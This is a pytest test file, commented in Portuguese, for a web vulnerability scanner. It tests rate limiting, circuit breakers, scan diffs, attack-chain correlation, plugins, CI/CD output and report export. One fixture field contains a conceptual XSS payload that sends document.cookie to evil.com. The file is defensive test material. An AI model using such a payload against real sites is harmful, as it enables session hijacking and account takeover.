"""
Testes Automatizados — VulnScanner v6
pytest + mocks para testar sem fazer requests reais.
Execute: pytest tests/ -v
"""

import pytest
import json
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture
def sample_report():
    return {
        "scan_id": "abc12345",
        "url": "https://exemplo.com",
        "score": 55,
        "elapsed": 45.2,
        "timestamp": "2024-01-15T03:00:00",
        "counts": {"critical": 1, "high": 2, "medium": 3, "low": 1, "info": 10},
        "modules": [
            {
                "module": "Headers HTTP",
                "icon": "ti-world",
                "findings": [
                    {"severity": "high", "title": "HSTS ausente", "detail": "Sem HSTS", "fix": "Configure HSTS"},
                    {"severity": "high", "title": "CSP ausente", "detail": "Sem CSP", "fix": "Configure CSP"},
                    {"severity": "info", "title": "X-Frame-Options presente", "detail": "OK", "fix": ""},
                ]
            },
            {
                "module": "OWASP Web",
                "icon": "ti-bug",
                "findings": [
                    {"severity": "critical", "title": "XSS Refletido detectado", "detail": "em /?q=", "fix": "Escape inputs", "cvss": "9.3"},
                    {"severity": "medium", "title": "Site vulnerável a Clickjacking", "detail": "Sem X-Frame", "fix": "Adicione X-Frame"},
                ]
            },
            {
                "module": "CORS Policy",
                "icon": "ti-arrows-exchange",
                "findings": [
                    {"severity": "high", "title": "CORS: origem refletida sem validação", "detail": "Aceita qualquer origin", "fix": "Valide origins"},
                ]
            },
            {
                "module": "Attack Chain Engine",
                "icon": "ti-arrows-join",
                "chains": [
                    {
                        "id": "account_takeover_xss_cookie",
                        "title": "Account Takeover via XSS + Cookie sem HttpOnly",
                        "severity": "critical",
                        "cvss_estimate": "9.8",
                        "findings_involved": ["XSS Refletido detectado", "Cookie sem flag HttpOnly"],
                        "attack_narrative": "XSS + Cookie sem HttpOnly = Account Takeover.",
                        "poc_conceptual": "<script>fetch('evil.com?c='+document.cookie)</script>",
                        "impact": "Roubo de sessão de qualquer usuário.",
                        "unified_fix": "Escape inputs + HttpOnly em todos cookies.",
                        "source": "static",
                    }
                ],
                "chains_count": 1,
                "ai_analysis": False,
                "findings": [
                    {"severity": "critical", "title": "[CHAIN] Account Takeover via XSS + Cookie", "detail": "...", "fix": "..."}
                ]
            }
        ],
        "executive": {
            "executive": {
                "summary": "1 vulnerabilidade crítica encontrada.",
                "overall_risk": "CRÍTICO",
                "max_cvss": 9.3,
                "avg_cvss": 5.2,
                "total_issues": 7,
                "score": 55,
            },
            "roadmap": [
                {"severity": "critical", "title": "Corrigir XSS", "module": "OWASP Web", "fix": "Escape inputs", "sla_days": 1, "cvss": 9.3},
                {"severity": "high", "title": "Configurar HSTS", "module": "Headers HTTP", "fix": "Configure HSTS", "sla_days": 7, "cvss": 7.5},
            ],
            "verification": {"confirmed": 0, "false_positives": 0, "log": []},
            "categories": {},
            "top_findings": [],
        },
        "severity_colors": {
            "critical": "#FF4757", "high": "#FFA502",
            "medium": "#3742FA", "low": "#2ED573", "info": "#747D8C",
        }
    }


@pytest.fixture
def old_report(sample_report):
    """Relatório de scan anterior para teste de diff."""
    r = json.loads(json.dumps(sample_report))
    r["scan_id"] = "old11111"
    r["score"] = 40
    r["counts"] = {"critical": 2, "high": 3, "medium": 2, "low": 1, "info": 8}
    return r


# ── Testes: Rate Limiter ──────────────────────────────────────────────────────

class TestRateLimiter:
    def test_profiles_exist(self):
        from modules.rate_limiter import PROFILES
        assert "stealth" in PROFILES
        assert "normal" in PROFILES
        assert "aggressive" in PROFILES

    def test_get_limiter_returns_correct_profile(self):
        from modules.rate_limiter import get_limiter, PROFILES
        limiter = get_limiter("stealth")
        assert limiter.max_per_second == PROFILES["stealth"].max_per_second

    def test_get_limiter_fallback(self):
        from modules.rate_limiter import get_limiter
        limiter = get_limiter("inexistente")
        assert limiter is not None


# ── Testes: Circuit Breaker ───────────────────────────────────────────────────

class TestCircuitBreaker:
    def test_initial_state_closed(self):
        from modules.circuit_breaker import CircuitBreaker, State
        cb = CircuitBreaker("test", failure_threshold=3, timeout=5)
        assert cb.state == State.CLOSED

    def test_opens_after_failures(self):
        from modules.circuit_breaker import CircuitBreaker, State, ModuleExecutionError
        cb = CircuitBreaker("test", failure_threshold=2, timeout=5)
        def fail_fn():
            raise ValueError("simulated failure")
        for _ in range(2):
            try:
                cb.call(fail_fn)
            except Exception:
                pass
        assert cb.state == State.OPEN

    def test_successful_call_stays_closed(self):
        from modules.circuit_breaker import CircuitBreaker, State
        cb = CircuitBreaker("test", failure_threshold=3, timeout=5)
        result = cb.call(lambda: {"module": "test", "icon": "ti-x", "findings": []})
        assert cb.state == State.CLOSED
        assert result["module"] == "test"

    def test_timeout_triggers_failure(self):
        import time
        from modules.circuit_breaker import CircuitBreaker, ModuleTimeoutError
        cb = CircuitBreaker("test", failure_threshold=3, timeout=0.1)
        def slow_fn():
            time.sleep(1)
            return {}
        with pytest.raises(ModuleTimeoutError):
            cb.call(slow_fn)

    def test_safe_run_module_returns_dict_on_error(self):
        from modules.circuit_breaker import safe_run_module
        def bad_fn(*a, **kw):
            raise RuntimeError("erro simulado")
        result = safe_run_module(bad_fn, "Teste", "ti-x", "https://exemplo.com")
        assert "findings" in result
        assert result["findings"][0]["severity"] == "info"

    def test_get_breakers_status(self):
        from modules.circuit_breaker import get_breaker, get_breakers_status
        get_breaker("SSL/TLS")
        status = get_breakers_status()
        assert isinstance(status, list)
        assert any(s["module"] == "SSL/TLS" for s in status)


# ── Testes: Scan Diff ─────────────────────────────────────────────────────────

class TestScanDiff:
    def test_no_changes(self, sample_report):
        from modules.scan_diff import compare_scans
        diff = compare_scans(sample_report, sample_report)
        assert diff["summary"]["new_count"] == 0
        assert diff["summary"]["fixed_count"] == 0
        assert diff["diff_status"] == "unchanged"

    def test_detects_new_vulnerabilities(self, old_report, sample_report):
        from modules.scan_diff import compare_scans
        # Remove um finding do old para simular finding novo no new
        old_report["modules"][0]["findings"] = [
            f for f in old_report["modules"][0]["findings"]
            if f["severity"] == "info"
        ]
        diff = compare_scans(old_report, sample_report)
        assert diff["summary"]["new_count"] > 0

    def test_detects_fixed_vulnerabilities(self, old_report, sample_report):
        from modules.scan_diff import compare_scans
        # Adiciona finding no old que não existe no new
        old_report["modules"][0]["findings"].append({
            "severity": "critical",
            "title": "Vuln antiga corrigida",
            "detail": "Existia antes",
            "fix": "Foi corrigida",
        })
        diff = compare_scans(old_report, sample_report)
        assert diff["summary"]["fixed_count"] > 0

    def test_score_delta(self, old_report, sample_report):
        from modules.scan_diff import compare_scans
        diff = compare_scans(old_report, sample_report)
        expected_delta = sample_report["score"] - old_report["score"]
        assert diff["score_delta"] == expected_delta

    def test_severity_delta_structure(self, old_report, sample_report):
        from modules.scan_diff import compare_scans
        diff = compare_scans(old_report, sample_report)
        assert "severity_delta" in diff
        for sev in ("critical", "high", "medium", "low"):
            assert sev in diff["severity_delta"]
            assert "diff" in diff["severity_delta"][sev]
            assert "trend" in diff["severity_delta"][sev]

    def test_improved_status(self, sample_report):
        from modules.scan_diff import compare_scans
        # Old tem finding que new não tem
        old = json.loads(json.dumps(sample_report))
        old["modules"][0]["findings"].append({
            "severity": "high", "title": "Bug antigo removido",
            "detail": "", "fix": ""
        })
        new = json.loads(json.dumps(sample_report))
        diff = compare_scans(old, new)
        assert diff["diff_status"] in ("improved", "unchanged", "mixed")


# ── Testes: Attack Chain Engine ───────────────────────────────────────────────

class TestAttackChainEngine:
    def test_static_correlation_xss_cookie(self):
        from modules.attack_chain_engine import _run_static_correlation
        findings = [
            {"module": "OWASP", "severity": "critical", "title": "XSS Refletido detectado", "detail": "", "cvss": ""},
            {"module": "Headers", "severity": "high", "title": "Cookie sem flag HttpOnly", "detail": "", "cvss": ""},
        ]
        chains = _run_static_correlation(findings)
        ids = [c["id"] for c in chains]
        assert "account_takeover_xss_cookie" in ids

    def test_static_correlation_no_match(self):
        from modules.attack_chain_engine import _run_static_correlation
        findings = [
            {"module": "SSL", "severity": "info", "title": "Certificado válido", "detail": "", "cvss": ""},
        ]
        chains = _run_static_correlation(findings)
        assert len(chains) == 0

    def test_analyze_returns_dict(self, sample_report):
        from modules.attack_chain_engine import analyze_attack_chains
        result = analyze_attack_chains(
            "https://exemplo.com",
            sample_report["modules"],
            use_ai=False
        )
        assert "module" in result
        assert "findings" in result
        assert "chains" in result
        assert result["module"] == "Attack Chain Engine"

    def test_analyze_empty_findings(self):
        from modules.attack_chain_engine import analyze_attack_chains
        result = analyze_attack_chains("https://exemplo.com", [], use_ai=False)
        assert "chains" in result
        assert result["module"] == "Attack Chain Engine"

    def test_extract_findings_filters_info(self, sample_report):
        from modules.attack_chain_engine import _extract_findings_summary
        findings = _extract_findings_summary(sample_report["modules"])
        assert all(f["severity"] != "info" for f in findings)


# ── Testes: Plugin Engine ─────────────────────────────────────────────────────

class TestPluginEngine:
    def test_valid_plugin_runs(self):
        from plugins.engine import run_plugin
        code = '''
def run(url, auth=None):
    return {
        "module": "Test Plugin",
        "icon": "ti-plug",
        "findings": [{"severity": "info", "title": "Test OK", "detail": "", "fix": ""}]
    }
'''
        result = run_plugin(code, "Test Plugin", "https://exemplo.com")
        assert result["module"] == "Test Plugin"
        assert len(result["findings"]) == 1

    def test_plugin_without_run_function(self):
        from plugins.engine import run_plugin
        code = "x = 1 + 1"
        result = run_plugin(code, "Bad Plugin", "https://exemplo.com")
        assert "não encontrada" in result["findings"][0]["title"]

    def test_plugin_with_exception(self):
        from plugins.engine import run_plugin
        code = '''
def run(url, auth=None):
    raise ValueError("erro proposital")
'''
        result = run_plugin(code, "Error Plugin", "https://exemplo.com")
        assert "Erro" in result["findings"][0]["title"]

    def test_plugin_normalizes_invalid_severity(self):
        from plugins.engine import run_plugin
        code = '''
def run(url, auth=None):
    return {
        "module": "Test",
        "icon": "ti-plug",
        "findings": [{"severity": "extreme", "title": "X", "detail": "", "fix": ""}]
    }
'''
        result = run_plugin(code, "Test", "https://exemplo.com")
        assert result["findings"][0]["severity"] == "info"

    def test_template_is_valid_python(self):
        from plugins.engine import get_plugin_template
        import ast
        template = get_plugin_template("Test", "Desc")
        try:
            ast.parse(template)
            valid = True
        except SyntaxError:
            valid = False
        assert valid


# ── Testes: CI/CD Integration ─────────────────────────────────────────────────

class TestCICD:
    def test_junit_xml_generation(self, sample_report):
        from cicd.integration import generate_junit_xml
        xml = generate_junit_xml(sample_report, fail_on="high")
        assert "<?xml" in xml
        assert "testsuites" in xml
        assert "failure" in xml  # Tem falhas high/critical

    def test_junit_xml_no_failures_when_fail_on_critical_only(self, sample_report):
        from cicd.integration import generate_junit_xml
        # Modifica para só ter low
        report = json.loads(json.dumps(sample_report))
        for mod in report["modules"]:
            for f in mod["findings"]:
                if f["severity"] in ("critical", "high", "medium"):
                    f["severity"] = "low"
        xml = generate_junit_xml(report, fail_on="critical")
        # Não deve ter failures de security vulns (só score pode falhar)
        assert "<?xml" in xml

    def test_exit_code_with_criticals(self, sample_report):
        from cicd.integration import get_exit_code
        assert get_exit_code(sample_report, fail_on="high") == 1

    def test_exit_code_clean_report(self):
        from cicd.integration import get_exit_code
        clean_report = {
            "counts": {"critical": 0, "high": 0, "medium": 2, "low": 1, "info": 5}
        }
        assert get_exit_code(clean_report, fail_on="high") == 0
        assert get_exit_code(clean_report, fail_on="medium") == 1

    def test_github_summary_contains_score(self, sample_report):
        from cicd.integration import generate_github_summary
        summary = generate_github_summary(sample_report)
        assert str(sample_report["score"]) in summary
        assert sample_report["url"] in summary

    def test_score_badge_svg(self):
        from cicd.integration import generate_score_badge
        svg_good = generate_score_badge(85)
        svg_warn = generate_score_badge(55)
        svg_bad  = generate_score_badge(25)
        assert "<svg" in svg_good
        assert "#2ED573" in svg_good
        assert "#FFA502" in svg_warn
        assert "#FF4757" in svg_bad


# ── Testes: PDF Export ────────────────────────────────────────────────────────

class TestPDFExport:
    def test_html_export_returns_bytes(self, sample_report):
        from export.pdf_generator import export_html
        result = export_html(sample_report)
        assert isinstance(result, bytes)
        assert b"VulnScanner" in result
        assert b"Relat" in result  # "Relatório"

    def test_html_contains_findings(self, sample_report):
        from export.pdf_generator import export_html
        html = export_html(sample_report).decode("utf-8")
        assert "XSS" in html
        assert "HSTS" in html

    def test_html_contains_score(self, sample_report):
        from export.pdf_generator import export_html
        html = export_html(sample_report).decode("utf-8")
        assert str(sample_report["score"]) in html

    def test_export_pdf_fallback(self, sample_report):
        from export.pdf_generator import export_pdf
        content, mime, ext = export_pdf(sample_report)
        assert isinstance(content, bytes)
        assert mime in ("application/pdf", "text/html")
        assert ext in (".pdf", ".html")


# ── Testes: Executive Report ──────────────────────────────────────────────────

class TestExecutiveReport:
    def test_generate_returns_required_keys(self, sample_report):
        from modules.executive_report import generate_executive_report
        result = generate_executive_report(
            url=sample_report["url"],
            scan_id=sample_report["scan_id"],
            elapsed=sample_report["elapsed"],
            score=sample_report["score"],
            counts=sample_report["counts"],
            modules_results=sample_report["modules"],
        )
        assert "executive" in result
        assert "top_findings" in result
        assert "roadmap" in result
        assert "categories" in result

    def test_overall_risk_critical(self, sample_report):
        from modules.executive_report import generate_executive_report
        result = generate_executive_report(
            url=sample_report["url"],
            scan_id=sample_report["scan_id"],
            elapsed=sample_report["elapsed"],
            score=25,
            counts={"critical": 3, "high": 2, "medium": 1, "low": 0, "info": 5},
            modules_results=sample_report["modules"],
        )
        assert result["executive"]["overall_risk"] == "CRÍTICO"

    def test_roadmap_ordered_by_severity(self, sample_report):
        from modules.executive_report import generate_executive_report
        result = generate_executive_report(
            url=sample_report["url"],
            scan_id=sample_report["scan_id"],
            elapsed=45.0,
            score=55,
            counts=sample_report["counts"],
            modules_results=sample_report["modules"],
        )
        roadmap = result["roadmap"]
        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        for i in range(len(roadmap) - 1):
            curr = sev_order.get(roadmap[i]["severity"], 99)
            next_ = sev_order.get(roadmap[i+1]["severity"], 99)
            assert curr <= next_


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
